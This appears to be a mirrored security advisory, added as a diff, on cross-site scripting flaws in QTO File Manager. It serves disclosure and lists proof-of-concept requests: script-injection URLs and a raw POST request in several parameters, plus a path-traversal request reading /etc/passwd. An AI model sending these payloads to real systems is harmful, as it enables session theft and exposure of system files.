@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/18791/info
+
+QTO File Manager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before displaying it to users of the application.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://target.xx/qtofm.php?delete=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&u=[username]&pathext=1 http://target.xx/qtofm.php?delete=COPYING&u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script% 3E 
+http://target.xx/qtofm.php?u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&edit=1 http://target.xx/qtofm.php?u=[username]&pathext=1&edit=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E --- POST http://target.xx:80/qtofm.php?u=[username]&pathext=1&edit=readme%2Etxt HTTP/1.0 
+Accept: */* Content-Type: application/x-www-form-urlencoded Host: target.xx Content-Length: 117 u=[username]&pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&newcontent=1&save=Save&savefile=1 -------- http://target.xx/qtofm.php?edit=../../../../../../../../../../../../etc/passwd&u=[username]&pathext= http://target.xx/qtofm.php?edit=qtofm.php&u=[username]&pathext=
